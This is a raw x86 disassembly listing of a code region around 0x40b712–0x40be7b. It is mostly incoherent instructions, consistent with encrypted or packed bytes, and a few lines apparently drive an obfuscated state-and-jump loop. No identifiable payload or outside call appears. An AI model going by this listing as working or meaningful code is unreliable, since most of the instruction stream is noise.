  40b712:	or     BYTE PTR [ecx-0x30e822c5],ch
  40b718:	mov    ch,BYTE PTR ds:[eax-0x15b13469]
  40b71f:	inc    ecx
  40b720:	push   edx
  40b721:	sub    dh,BYTE PTR [edi]
  40b723:	inc    ebp
  40b725:	fcmovnbe st,st(6)
  40b727:	cmc    
  40b728:	push   edx
  40b729:	pusha  
  40b72a:	cmp    eax,0xbe44f796
  40b72f:	sub    BYTE PTR [edx+0x2a],ah
  40b732:	dec    ebp
  40b733:	mov    edx,0xa682f19c
  40b738:	mov    ebp,0x5781420e
  40b73d:	dec    edx
  40b73e:	jno    0x40b76f
  40b740:	and    ax,0xea5b
  40b744:	xchg   esp,eax
  40b745:	mov    WORD PTR [esi],gs
  40b747:	add    al,dh
  40b749:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b74a:	lods   eax,DWORD PTR ds:[esi]
  40b74b:	push   eax
  40b74c:	dec    edx
  40b74d:	jbe    0x40b747
  40b74f:	or     BYTE PTR [ebp+0x49],al
  40b752:	(bad)  [ebx]
  40b754:	dec    esp
  40b755:	jo     0x40b733
  40b757:	inc    edi
  40b758:	fstp   DWORD PTR [edx+ecx*2]
  40b75b:	dec    ebp
  40b75c:	jnp    0x40b7db
  40b75e:	push   ebx
  40b75f:	test   BYTE PTR [esi+0x5d],ch
  40b762:	jg     0x40b70f
  40b764:	sahf   
  40b765:	inc    ebp
  40b767:	mov    esp,0xd9886e79
  40b76c:	(bad)  
  40b76d:	aad    0x37
  40b76f:	cmp    eax,DWORD PTR [edi-0x12ca40f5]
  40b775:	dec    ebx
  40b776:	adc    al,0x6f
  40b778:	mov    DWORD PTR [eax+ebx*4+0x50afe558],ebx
  40b77f:	jae    0x40b76f
  40b781:	adc    DWORD PTR [esi-0x2b],edx
  40b784:	in     al,dx
  40b785:	dec    esi
  40b786:	pop    ss
  40b787:	int3   
  40b788:	icebp  
  40b789:	or     BYTE PTR [edx-0x3f],ah
  40b78c:	test   BYTE PTR [eax+0x33],cl
  40b78f:	adc    BYTE PTR [eax+edx*4-0x4d52dc78],al
  40b796:	aad    0x5d
  40b798:	loop   0x40b7cd
  40b79a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b79b:	dec    edx
  40b79c:	test   DWORD PTR [eax+0x71],esi
  40b79f:	pop    ebx
  40b7a0:	les    esp,FWORD PTR [ebp+0x63]
  40b7a3:	xor    edx,eax
  40b7a5:	mov    al,ds:0x7b0dd37d
  40b7aa:	or     DWORD PTR [eax],ebp
  40b7ac:	sahf   
  40b7ad:	fisubr WORD PTR [esp+edx*4-0x36]
  40b7b1:	xchg   edi,eax
  40b7b2:	(bad)  
  40b7b3:	sahf   
  40b7b4:	test   al,0x27
  40b7b6:	mov    BYTE PTR [edx],dh
  40b7b8:	popf   
  40b7b9:	pop    esi
  40b7ba:	ret    0x2821
  40b7bd:	cli    
  40b7be:	lods   eax,DWORD PTR ds:[esi]
  40b7bf:	inc    edx
  40b7c0:	add    edi,esp
  40b7c2:	cdq    
  40b7c3:	popf   
  40b7c4:	xor    eax,0x439840f4
  40b7c9:	mov    bl,0x15
  40b7cb:	add    eax,DWORD PTR [ecx]
  40b7cd:	push   edi
  40b7ce:	dec    ecx
  40b7cf:	not    DWORD PTR [ecx+0x53f3d57e]
  40b7d5:	jb     0x40b76a
  40b7d7:	xlat   BYTE PTR ds:[ebx]
  40b7d8:	addr16 std 
  40b7da:	sbb    bl,0x8b
  40b7dd:	sahf   
  40b7de:	mov    esi,cs
  40b7e0:	nop
  40b7e1:	or     eax,0xfbf60881
  40b7e6:	mov    ch,0xef
  40b7e8:	jo     0x40b78a
  40b7ea:	fist   WORD PTR [esi+0x13]
  40b7ed:	test   BYTE PTR [ecx-0x6],dl
  40b7f0:	pop    eax
  40b7f1:	in     al,0xcb
  40b7f3:	lods   al,BYTE PTR ds:[esi]
  40b7f4:	retf   
  40b7f5:	fwait
  40b7f6:	dec    ebx
  40b7f7:	lods   al,BYTE PTR ds:[esi]
  40b7f8:	xor    al,0x39
  40b7fa:	stos   BYTE PTR es:[edi],al
  40b7fb:	push   eax
  40b7fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b7fd:	xchg   DWORD PTR ds:0x5a2c6a32,eax
  40b803:	add    DWORD PTR [eax+0x20fe99bd],ebp
  40b809:	push   ds
  40b80a:	mov    cs,WORD PTR [esp+esi*1]
  40b80d:	fsubr  QWORD PTR [eax]
  40b80f:	xor    ch,al
  40b811:	push   ds
  40b812:	call   0x76fe:0x4ce4c9f2
  40b819:	cld    
  40b81a:	outs   dx,BYTE PTR ds:[esi]
  40b81b:	sbb    eax,0xbee69eec
  40b820:	loop   0x40b7f0
  40b822:	dec    edx
  40b823:	jecxz  0x40b7bb
  40b825:	fisttp WORD PTR [edx]
  40b827:	out    dx,eax
  40b828:	push   DWORD PTR [ebx-0x17]
  40b82b:	jmp    0x40b81f
  40b82d:	fnstenv [eax+0xe]
  40b830:	sub    ebp,DWORD PTR [edi+0x53]
  40b833:	hlt    
  40b834:	ret    0xbdeb
  40b837:	mov    bl,0x71
  40b839:	inc    ecx
  40b83a:	pop    edi
  40b83b:	retf   0xe34d
  40b83e:	jne    0x40b81c
  40b840:	jmp    0xb17e2f5f
  40b845:	mov    ds:0x39ed2079,eax
  40b84a:	push   cs
  40b84b:	test   eax,0x1b83d319
  40b850:	mov    al,ds:0x98fb39b9
  40b855:	mov    bl,BYTE PTR [ecx]
  40b857:	pop    ds
  40b858:	pop    eax
  40b859:	lds    ebp,FWORD PTR [eax+0x2417689f]
  40b85f:	in     al,dx
  40b860:	push   ds
  40b861:	(bad)
  40b865:	inc    ecx
  40b866:	retf   0x9b06
  40b869:	xchg   edx,eax
  40b86a:	add    eax,0xc90a6d8
  40b86f:	addr16 out dx,eax
  40b871:	ficomp WORD PTR [edi-0x7c]
  40b874:	jmp    0x40b865
  40b876:	test   al,0xae
  40b878:	fistp  QWORD PTR [eax+0x63120e2]
  40b87e:	adc    BYTE PTR [ebx-0x4a204564],dh
  40b884:	sti    
  40b885:	mov    ebp,0xe49fc569
  40b88a:	jb     0x40b898
  40b88c:	test   al,0x3f
  40b88e:	add    eax,0x9a4fea2a
  40b893:	out    dx,eax
  40b894:	test   BYTE PTR [ebx+0x373b556a],ch
  40b89a:	out    0x1b,eax
  40b89c:	js     0x40b821
  40b89e:	and    al,0x3f
  40b8a0:	in     eax,dx
  40b8a1:	mov    bh,0xf
  40b8a3:	sbb    BYTE PTR [ecx+0x18],dl
  40b8a6:	mov    ebx,0xae8307cf
  40b8ab:	cli    
  40b8ac:	mov    esi,0x2a80d5e2
  40b8b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b8b2:	pop    edi
  40b8b3:	mov    dl,0x58
  40b8b5:	or     ah,BYTE PTR [ecx]
  40b8b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b8b8:	mov    cl,0xc
  40b8ba:	addr16 mov cl,0x3b
  40b8bd:	(bad)  [ecx+edx*2]
  40b8c0:	jg     0x40b8fa
  40b8c2:	dec    edx
  40b8c3:	mov    ebp,0x24dcef4b
  40b8c8:	aas    
  40b8c9:	test   DWORD PTR [ecx-0x73],ebx
  40b8cc:	(bad)  
  40b8cd:	addr16 xchg ebx,eax
  40b8cf:	add    al,0x77
  40b8d1:	out    0x85,al
  40b8d3:	xor    eax,0x87eddeb0
  40b8d8:	pop    eax
  40b8d9:	sub    dh,BYTE PTR [ecx+0x7a]
  40b8dc:	cmp    eax,0xab66344f
  40b8e1:	sbb    eax,ebx
  40b8e3:	dec    ebx
  40b8e4:	jb     0x40b91f
  40b8e6:	and    bh,BYTE PTR [ebx-0x43]
  40b8e9:	or     eax,0x543b058f
  40b8ee:	pop    ecx
  40b8ef:	iret   
  40b8f0:	sub    BYTE PTR [ebx+eiz*4-0x67955d31],bh
  40b8f7:	jle    0x40b976
  40b8f9:	push   ds
  40b8fa:	xor    esi,DWORD PTR [eax-0x65]
  40b8fd:	inc    edx
  40b8fe:	je     0x40b8cf
  40b900:	and    eax,0x93ca3e35
  40b905:	ret    0x3b12
  40b908:	popf   
  40b909:	fdivr  DWORD PTR [esi+0x6e8d9be]
  40b90f:	and    eax,0x2b335c10
  40b914:	cmp    eax,0x7b31a8c6
  40b919:	je     0x40bc46
  40b91f:	mov    eax,DWORD PTR [ebp-0x10]
  40b922:	and    DWORD PTR [eax],0x751c80
  40b928:	jmp    0x40b5e7
  40b92d:	jmp    0x40bc46
  40b932:	into   
  40b933:	aas    
  40b934:	ds ror ebp,0xc1
  40b938:	rcl    ebx,1
  40b93a:	add    esi,DWORD PTR [edi]
  40b93c:	stos   DWORD PTR es:[edi],eax
  40b93d:	rol    DWORD PTR [edx-0x39f3349b],cl
  40b943:	mov    WORD PTR [eax+0x78],?
  40b946:	je     0x40b9c6
  40b948:	js     0x40b9c2
  40b94a:	sub    DWORD PTR [eax+0x27],eax
  40b94d:	sub    bl,BYTE PTR [ebx]
  40b94f:	push   ds
  40b950:	pushf  
  40b951:	ja     0x40b96b
  40b953:	fstp   st(7)
  40b955:	aaa    
  40b956:	and    al,0xb3
  40b958:	popf   
  40b959:	sbb    eax,0xb080dba8
  40b95e:	xchg   dh,ch
  40b960:	inc    edx
  40b961:	add    DWORD PTR [edx+0x6f210b52],esi
  40b967:	sub    ecx,DWORD PTR [esi]
  40b969:	cpuid  
  40b96b:	aas    
  40b96c:	mov    bl,0xc2
  40b96e:	test   al,0xec
  40b970:	pop    esp
  40b971:	test   DWORD PTR [edx-0x41],edx
  40b974:	je     0x40b981
  40b976:	aaa    
  40b977:	inc    ebp
  40b978:	ret    0x19d5
  40b97b:	hlt    
  40b97c:	mov    al,0xa9
  40b97e:	mov    edi,0x5f47a3de
  40b983:	sub    BYTE PTR [ebx+0x78],ah
  40b986:	aas    
  40b987:	fld    TBYTE PTR [ebp-0xe]
  40b98a:	sub    eax,0x5814c43e
  40b98f:	dec    esp
  40b990:	fld    QWORD PTR [esi+ebx*8-0x6b]
  40b994:	sbb    DWORD PTR [eax],ebx
  40b996:	add    ebx,esi
  40b998:	pop    ebp
  40b999:	and    edx,DWORD PTR [ebx-0x235a089e]
  40b99f:	popa   
  40b9a0:	lods   al,BYTE PTR ds:[esi]
  40b9a1:	dec    ebp
  40b9a2:	add    DWORD PTR [ecx+0x150cb8c1],edi
  40b9a8:	sbb    al,0x7d
  40b9aa:	adc    DWORD PTR [ecx],ecx
  40b9ac:	or     esi,ecx
  40b9ae:	ins    BYTE PTR es:[edi],dx
  40b9af:	jmp    0x40b94a
  40b9b1:	(bad)  [ebx+0x29]
  40b9b4:	arpl   WORD PTR [ecx-0x4faefc9d],bx
  40b9ba:	mov    edi,0x21566f1a
  40b9bf:	or     bl,bh
  40b9c1:	pusha  
  40b9c2:	cwde   
  40b9c3:	mov    DWORD PTR [ecx-0x694fa2c2],esp
  40b9c9:	pop    esp
  40b9ca:	xchg   BYTE PTR [edx-0x15],dl
  40b9cd:	cmc    
  40b9ce:	cmp    al,dl
  40b9d0:	mov    ch,0xa6
  40b9d2:	xor    al,0x9f
  40b9d4:	jo     0x40b9d2
  40b9d6:	push   esp
  40b9d7:	aaa    
  40b9d8:	rcr    BYTE PTR [edx+ebp*1+0x4620c3ad],0x59
  40b9e0:	repnz (bad) 
  40b9e2:	retf   0x576a
  40b9e5:	mov    al,0x15
  40b9e7:	push   ebx
  40b9e8:	dec    esi
  40b9e9:	inc    esi
  40b9ea:	mov    esi,gs
  40b9ec:	mov    bl,0x9b
  40b9ee:	or     dl,BYTE PTR [edi+ebx*2]
  40b9f1:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  40b9f3:	clc    
  40b9f4:	jne    0x40b9c0
  40b9f6:	call   0xa8824889
  40b9fb:	and    ah,BYTE PTR [edi-0x3860345f]
  40ba01:	sbb    eax,0xdb1ce0c7
  40ba06:	jnp    0x40b999
  40ba08:	and    edx,ecx
  40ba0a:	test   DWORD PTR [ebp+0xf],ebx
  40ba0d:	sub    esi,esi
  40ba0f:	cmp    dh,al
  40ba11:	ret    
  40ba12:	jle    0x40b9a3
  40ba14:	xor    eax,0x34f9cf30
  40ba19:	pop    eax
  40ba1a:	fsubr  st,st(0)
  40ba1c:	shr    DWORD PTR [ebx-0x407f25fa],0xba
  40ba23:	jae    0x40b9a5
  40ba25:	sbb    al,0x6c
  40ba27:	add    al,BYTE PTR [ebx]
  40ba29:	or     eax,0xcf02d50
  40ba2e:	pavgb  mm7,QWORD PTR [esp+eiz*2]
  40ba32:	push   eax
  40ba33:	push   ebp
  40ba34:	inc    ebx
  40ba35:	sub    al,0x7a
  40ba37:	sub    DWORD PTR [esi+edx*1+0xefd377],0x1e
  40ba3f:	push   esp
  40ba40:	andnps xmm6,XMMWORD PTR [ebx+0x56065d1f]
  40ba47:	mov    ds:0xbf3e4b2,eax
  40ba4c:	sahf   
  40ba4d:	push   esi
  40ba4e:	push   edx
  40ba4f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ba50:	jne    0x40babf
  40ba52:	pop    ecx
  40ba53:	jmp    FWORD PTR [edi]
  40ba55:	stos   BYTE PTR es:[edi],al
  40ba56:	mov    dl,0xc1
  40ba58:	sub    al,BYTE PTR [ebp-0x78]
  40ba5b:	inc    eax
  40ba5c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ba5d:	fwait
  40ba5e:	sbb    al,0x59
  40ba60:	xor    eax,0x70e7a726
  40ba65:	mov    ah,ch
  40ba67:	in     eax,dx
  40ba68:	mov    eax,0xde2828e2
  40ba6d:	jmp    0x40b9f1
  40ba6f:	push   0x73
  40ba71:	call   0x42fe1354
  40ba76:	xor    DWORD PTR [ebp-0x248fa2d],esp
  40ba7c:	cmp    BYTE PTR [ebx+eax*1],al
  40ba7f:	jbe    0x40ba57
  40ba81:	adc    BYTE PTR [ebx+ebp*1+0x3e],0xb2
  40ba86:	dec    ecx
  40ba87:	fild   WORD PTR [edi-0x7591bc08]
  40ba8d:	iret   
  40ba8e:	mov    ebx,0x71559e59
  40ba93:	pop    eax
  40ba94:	idiv   BYTE PTR [esp+ebp*8-0x89fa561]
  40ba9b:	aad    0x74
  40ba9d:	aam    0xf7
  40ba9f:	(bad)  
  40baa0:	fnstenv [edx+0x4c2a1881]
  40baa6:	mov    BYTE PTR [ebx+0x341e6491],cl
  40baac:	and    edi,ebx
  40baae:	pop    eax
  40baaf:	push   0x8f723bbd
  40bab4:	cmc    
  40bab5:	or     esi,ebx
  40bab7:	lahf   
  40bab8:	pop    esi
  40bab9:	pop    es
  40baba:	xor    eax,DWORD PTR [esi]
  40babc:	or     al,0x27
  40babe:	cs enter 0x2eea,0xd7
  40bac3:	mov    ebx,0x36bc8a67
  40bac8:	jmp    0x40ba62
  40baca:	adc    edx,DWORD PTR [ecx+0x7c]
  40bacd:	cmp    ch,BYTE PTR [edx-0x1e0e819e]
  40bad3:	jg     0x40ba90
  40bad5:	ror    DWORD PTR [ebx-0x2f],0x44
  40bad9:	les    ecx,FWORD PTR [edx-0x21]
  40badc:	cld    
  40badd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bade:	adc    DWORD PTR [ecx+0x4c5aa064],0x951fb2ad
  40bae8:	sbb    ebx,eax
  40baea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40baeb:	push   edx
  40baec:	mov    eax,ds:0x78c4dfc6
  40baf1:	mov    esp,0x20adc5d3
  40baf6:	or     eax,0xd2329402
  40bafb:	xlat   BYTE PTR ds:[ebx]
  40bafc:	push   esp
  40bafd:	mov    bl,0x86
  40baff:	jb     0x40bac9
  40bb01:	fidivr WORD PTR [esi]
  40bb03:	fist   WORD PTR [ecx+0x63]
  40bb06:	pop    ds
  40bb07:	jg     0x40bab3
  40bb09:	xchg   DWORD PTR [edi+0xd],ebx
  40bb0c:	dec    ecx
  40bb0d:	cwde   
  40bb0e:	lds    ebp,FWORD PTR [ebx-0x1a2a17ef]
  40bb14:	sti    
  40bb15:	mov    ah,0x24
  40bb17:	sbb    ecx,edx
  40bb19:	and    eax,0x7d11eb05
  40bb1e:	mov    edi,0xde7aefe6
  40bb23:	stc    
  40bb24:	scas   al,BYTE PTR es:[edi]
  40bb25:	fist   WORD PTR fs:[ecx-0xa]
  40bb29:	dec    ecx
  40bb2a:	jecxz  0x40bb53
  40bb2c:	push   0xf942cfa5
  40bb31:	jne    0x40bad8
  40bb33:	pop    ds
  40bb34:	aad    0x3a
  40bb36:	arpl   bx,bx
  40bb38:	mov    esp,DWORD PTR [edx+0x64]
  40bb3b:	adc    eax,0x23d0bae6
  40bb40:	stos   BYTE PTR es:[edi],al
  40bb41:	inc    esp
  40bb42:	repnz loope 0x40bb8c
  40bb45:	xor    eax,0xf1a6ef07
  40bb4a:	add    BYTE PTR [edi-0x56],dh
  40bb4d:	dec    ebx
  40bb4e:	mov    bl,BYTE PTR [ebx+0x29]
  40bb51:	push   ecx
  40bb52:	push   esi
  40bb53:	or     DWORD PTR [ebp+0x21],edx
  40bb56:	mov    ebp,0x5f66362
  40bb5b:	test   BYTE PTR [esi+0x72867b14],dh
  40bb61:	aaa    
  40bb62:	lods   al,BYTE PTR ds:[esi]
  40bb63:	mov    bh,0xc3
  40bb65:	mov    DWORD PTR ds:0x4c562f52,esi
  40bb6b:	and    al,0xfb
  40bb6d:	sbb    DWORD PTR [ebp+0xb],edi
  40bb70:	push   eax
  40bb71:	icebp  
  40bb72:	mov    ah,0x5f
  40bb74:	mov    edi,0xbfc5de96
  40bb79:	sar    ecx,cl
  40bb7b:	add    dh,bh
  40bb7d:	ins    DWORD PTR es:[edi],dx
  40bb7e:	ror    DWORD PTR [ebp+0x6419c1b1],1
  40bb84:	xchg   esi,eax
  40bb85:	jns    0x40bb3f
  40bb87:	push   edi
  40bb88:	in     eax,dx
  40bb89:	aam    0xc3
  40bb8b:	mov    ?,ebp
  40bb8d:	popf   
  40bb8e:	jecxz  0x40bb5c
  40bb90:	stc    
  40bb91:	inc    esp
  40bb92:	mov    ebx,DWORD PTR [edi-0x2fbf4d4c]
  40bb98:	push   ds
  40bb99:	lock pop ebp
  40bb9b:	nop
  40bb9c:	mov    ch,0x62
  40bb9e:	das    
  40bb9f:	out    dx,al
  40bba0:	das    
  40bba1:	xor    BYTE PTR [eax-0x11],dh
  40bba4:	mov    DWORD PTR [ecx-0x4c2ef0f7],0x988ea378
  40bbae:	sbb    DWORD PTR [edi+0x4dbdbd05],0x790cf5c7
  40bbb8:	pop    eax
  40bbb9:	cmp    BYTE PTR [esi+0x7],al
  40bbbc:	inc    si
  40bbbe:	dec    esi
  40bbbf:	pop    ecx
  40bbc0:	jnp    0x40bbee
  40bbc2:	je     0x40bb8a
  40bbc4:	mov    dh,0x61
  40bbc6:	ficomp WORD PTR [ebp+0x74346440]
  40bbcc:	add    DWORD PTR [esi+0x4c937839],esp
  40bbd2:	or     al,0xfb
  40bbd4:	js     0x40bbf4
  40bbd6:	in     eax,dx
  40bbd7:	daa    
  40bbd8:	ja     0x40bc4b
  40bbda:	call   0x64790a03
  40bbdf:	jo     0x40bc41
  40bbe1:	xchg   edx,eax
  40bbe2:	jae    0x40bc01
  40bbe4:	nop
  40bbe5:	xor    esp,DWORD PTR [esi-0x3a]
  40bbe8:	jle    0x40bb91
  40bbea:	push   cs
  40bbeb:	mov    al,ds:0xcf34adc3
  40bbf0:	test   BYTE PTR [ecx-0x41536439],ch
  40bbf6:	inc    edx
  40bbf7:	mov    ah,0xac
  40bbf9:	mov    BYTE PTR [eax-0x56bdb65f],cl
  40bbff:	leave  
  40bc00:	cmp    BYTE PTR [ebp+0x55],al
  40bc03:	popa   
  40bc04:	push   ss
  40bc05:	pop    ebx
  40bc06:	or     BYTE PTR [esp+edi*2],al
  40bc09:	nop
  40bc0a:	or     ebx,DWORD PTR [edx+eax*2+0x9]
  40bc0e:	jecxz  0x40bb9c
  40bc10:	mov    esi,ebx
  40bc12:	add    DWORD PTR [esi-0x43424067],eax
  40bc18:	test   eax,0x2e464502
  40bc1d:	retf   
  40bc1e:	gs jae 0x40bc45
  40bc21:	sbb    DWORD PTR [edi],eax
  40bc23:	cdq    
  40bc24:	into   
  40bc25:	mov    esi,0xeb37b3fb
  40bc2a:	popf   
  40bc2b:	pop    ebx
  40bc2c:	jmp    0xeb6c954e
  40bc31:	idiv   DWORD PTR [ecx-0x4c]
  40bc34:	push   0x2f
  40bc36:	(bad)  
  40bc37:	push   ecx
  40bc38:	arpl   WORD PTR [eax+0x3209cfc2],di
  40bc3e:	dec    ax
  40bc40:	jmp    0x40bbc3
  40bc42:	push   edi
  40bc43:	sbb    eax,0x458b1763
  40bc48:	hlt    
  40bc49:	mov    edx,DWORD PTR [ebp-0x18]
  40bc4c:	or     eax,edx
  40bc4e:	cmp    eax,0xfa9f7e76
  40bc53:	je     0x40bc67
  40bc59:	mov    eax,DWORD PTR [ebp-0x10]
  40bc5c:	xor    DWORD PTR [eax],0x2650fa8e
  40bc62:	jmp    0x40b5e7
  40bc67:	mov    ax,WORD PTR [ebp-0x4]
  40bc6b:	jmp    0x40bf84
  40bc70:	(bad)  
  40bc71:	ds ret 
  40bc73:	ror    bl,cl
  40bc75:	rcl    ebp,1
  40bc77:	fisubr DWORD PTR [ebp+0x56]
  40bc7a:	xchg   esp,eax
  40bc7b:	jge    0x40bc65
  40bc7d:	div    bh
  40bc7f:	rol    dl,cl
  40bc81:	xchg   ecx,eax
  40bc82:	js     0x40bcfc
  40bc84:	je     0x40bd04
  40bc86:	js     0x40bd00
  40bc88:	cmp    BYTE PTR [ecx+0x74],al
  40bc8b:	dec    edx
  40bc8c:	xchg   esp,eax
  40bc8d:	hlt    
  40bc8e:	aas    
  40bc8f:	sub    eax,0xd920db4c
  40bc94:	inc    ecx
  40bc95:	inc    esi
  40bc96:	xchg   esi,eax
  40bc97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bc98:	into   
  40bc99:	iret   
  40bc9a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bc9b:	mov    ds:0xd4520924,al
  40bca0:	stos   BYTE PTR es:[edi],al
  40bca1:	pop    esp
  40bca2:	cmp    eax,0xc903099c
  40bca7:	adc    BYTE PTR [edi-0x33bb76e1],al
  40bcad:	adc    dh,BYTE PTR fs:[edi+0x39211152]
  40bcb4:	and    eax,0xe5f784d4
  40bcb9:	es daa 
  40bcbb:	pop    ebx
  40bcbc:	clc    
  40bcbd:	aaa    
  40bcbe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bcbf:	fmul   st,st(0)
  40bcc1:	mov    BYTE PTR [ebx+0x2b89deef],ah
  40bcc7:	or     ah,bh
  40bcc9:	jbe    0x40bcab
  40bccb:	gs ds out dx,al
  40bcce:	inc    ebx
  40bccf:	sbb    eax,0x78d67d69
  40bcd4:	add    al,0x71
  40bcd6:	and    cl,BYTE PTR [ebp-0x50]
  40bcd9:	add    DWORD PTR [eax+ecx*1-0xe9b8ce2],esi
  40bce0:	in     al,0x1b
  40bce2:	out    0x29,eax
  40bce4:	in     eax,0xde
  40bce6:	out    dx,eax
  40bce7:	not    DWORD PTR [edx]
  40bce9:	(bad)  
  40bcea:	jb     0x40bcf3
  40bcec:	into   
  40bced:	ins    BYTE PTR es:[edi],dx
  40bcee:	sbb    eax,0x610f8472
  40bcf3:	adc    BYTE PTR [eax-0x6bd1401],ch
  40bcf9:	mov    ss,ebx
  40bcfb:	mov    dl,0x31
  40bcfd:	sub    cl,BYTE PTR [ecx]
  40bcff:	pop    esp
  40bd00:	sbb    eax,0x4f9a10c1
  40bd05:	ror    DWORD PTR [edx+0x55],cl
  40bd08:	xchg   edi,eax
  40bd09:	dec    edx
  40bd0a:	jecxz  0x40bd73
  40bd0c:	ror    ah,cl
  40bd0e:	mov    ds:0xf64c0716,eax
  40bd13:	jno    0x40bd10
  40bd15:	push   0x2714c3fc
  40bd1a:	and    al,0x49
  40bd1c:	mov    bh,BYTE PTR [esi-0x2f9db285]
  40bd22:	inc    ecx
  40bd23:	push   ss
  40bd24:	xchg   edx,eax
  40bd25:	push   esi
  40bd26:	inc    ecx
  40bd27:	out    dx,al
  40bd28:	jbe    0x40bd54
  40bd2a:	push   ebx
  40bd2b:	add    DWORD PTR [edi-0x5b3c8c1d],ebp
  40bd31:	xor    BYTE PTR [edx],0xe
  40bd34:	repnz inc edx
  40bd36:	xlat   BYTE PTR ds:[ebx]
  40bd37:	std    
  40bd38:	pushf  
  40bd39:	js     0x40bd11
  40bd3b:	popa   
  40bd3c:	mov    edx,0x9577f05d
  40bd41:	daa    
  40bd42:	xor    dl,0xd5
  40bd45:	gs iret 
  40bd47:	or     dh,BYTE PTR [ebx]
  40bd49:	sub    bl,BYTE PTR [edx-0xf7b85f0]
  40bd4f:	cmp    esi,DWORD PTR [edx+0x1]
  40bd52:	mov    esp,0x4ab9f6d8
  40bd57:	inc    esp
  40bd58:	mov    ds:0xea90470c,eax
  40bd5d:	ja     0x40bd01
  40bd5f:	in     eax,dx
  40bd60:	jne    0x40bd0b
  40bd62:	nop
  40bd63:	pop    ecx
  40bd64:	inc    ecx
  40bd65:	mov    bh,0x8
  40bd67:	xchg   ebp,eax
  40bd68:	xchg   edx,eax
  40bd69:	push   edi
  40bd6a:	pop    es
  40bd6b:	ja     0x40bda5
  40bd6d:	cmp    al,0xb1
  40bd6f:	xchg   BYTE PTR [edx-0x6d],dh
  40bd72:	(bad)  [edx-0x75845dd8]
  40bd78:	jno    0x40bd55
  40bd7a:	push   0x6a22689a
  40bd7f:	or     dl,bl
  40bd81:	xor    eax,0x4cbe1193
  40bd86:	dec    edx
  40bd87:	mov    ch,0x86
  40bd89:	iret   
  40bd8a:	imul   eax,DWORD PTR [ecx*4-0x1fdba0f9],0x43
  40bd92:	jo     0x40bded
  40bd94:	loope  0x40bdd8
  40bd96:	xchg   esp,eax
  40bd97:	into   
  40bd98:	sub    DWORD PTR [ecx],ecx
  40bd9a:	or     ebx,DWORD PTR [eax-0x72]
  40bd9d:	lahf   
  40bd9e:	and    eax,0x9299ea1
  40bda3:	lock cmp al,0xf7
  40bda6:	cs jo  0x40bd69
  40bda9:	adc    ch,cl
  40bdab:	les    ebx,FWORD PTR [eax+0x10]
  40bdae:	ins    BYTE PTR es:[edi],dx
  40bdaf:	imul   edx,DWORD PTR [esi+0x2e0bd29b],0xd713e57d
  40bdb9:	pop    ecx
  40bdba:	in     al,dx
  40bdbb:	cli    
  40bdbc:	ins    DWORD PTR es:[edi],dx
  40bdbd:	outs   dx,BYTE PTR ds:[esi]
  40bdbe:	pop    esi
  40bdbf:	xchg   ebx,eax
  40bdc0:	cmp    al,0xcc
  40bdc2:	lock hlt 
  40bdc4:	pop    edi
  40bdc5:	lock jb 0x40bd90
  40bdc8:	jo     0x40bda8
  40bdca:	icebp  
  40bdcb:	mov    ebx,0x6a887353
  40bdd0:	std    
  40bdd1:	data16 (bad) 
  40bdd3:	test   BYTE PTR [esi-0x437870fd],ah
  40bdd9:	adc    eax,0xbf82d1ef
  40bdde:	rcr    ch,cl
  40bde0:	or     cl,BYTE PTR [edx-0x2b]
  40bde3:	inc    ebp
  40bde4:	adc    dh,al
  40bde6:	mov    al,0x8e
  40bde8:	arpl   WORD PTR [bp+si],ax
  40bdeb:	cmc    
  40bdec:	je     0x40bd94
  40bdee:	jnp    0x40bdd3
  40bdf0:	pop    ss
  40bdf1:	sti    
  40bdf2:	mov    ch,0xe7
  40bdf4:	inc    esi
  40bdf5:	xchg   BYTE PTR [esi],dh
  40bdf7:	ret    
  40bdf8:	fs aad 0x42
  40bdfb:	mov    dh,0x1a
  40bdfd:	jbe    0x40be6c
  40bdff:	inc    eax
  40be00:	cmp    ah,BYTE PTR [esp+edi*2-0x7b]
  40be04:	add    al,ch
  40be06:	xor    al,0xd9
  40be08:	lea    edx,[edx+0xd37dbca]
  40be0e:	mov    bh,0x54
  40be10:	jns    0x40bdf9
  40be12:	jne    0x40be7d
  40be14:	out    0xda,al
  40be16:	xchg   esi,eax
  40be17:	adc    al,0x4f
  40be19:	gs sti 
  40be1b:	enter  0x752c,0x5c
  40be1f:	mov    ah,0xa4
  40be21:	add    edx,eax
  40be23:	je     0x40bdd2
  40be25:	mov    eax,0x222c73ef
  40be2a:	inc    edx
  40be2b:	pusha  
  40be2c:	clc    
  40be2d:	push   eax
  40be2e:	mov    bh,BYTE PTR [esi-0x76]
  40be31:	jmp    0x221b4c3
  40be36:	sub    bh,BYTE PTR [edi+edi*1-0x647f4b11]
  40be3d:	ins    BYTE PTR es:[edi],dx
  40be3e:	sub    DWORD PTR ds:0xa8d705f8,esi
  40be44:	mov    DWORD PTR [bx+di+0x41],edi
  40be48:	jmp    0x40bebf
  40be4a:	push   ecx
  40be4b:	jb     0x40be6c
  40be4d:	pushf  
  40be4e:	jg     0x40bddf
  40be50:	outs   dx,DWORD PTR ds:[esi]
  40be51:	jb     0x40beaf
  40be53:	jl     0x40be97
  40be55:	jge    0x40be4a
  40be57:	jg     0x40be72
  40be59:	push   edi
  40be5a:	rol    cl,1
  40be5c:	mov    ah,0x79
  40be5e:	or     al,0x96
  40be60:	dec    esi
  40be61:	jp     0x40beab
  40be63:	pop    es
  40be64:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40be65:	mov    bl,0xc3
  40be67:	cmp    DWORD PTR [ecx+0x16],ebp
  40be6a:	leave  
  40be6b:	stos   DWORD PTR es:[edi],eax
  40be6c:	ret    0xcda3
  40be6f:	push   ebp
  40be70:	fistp  QWORD PTR [eax+0x74748b88]
  40be76:	add    eax,0xf8b6f70
  40be7b:	cwde   
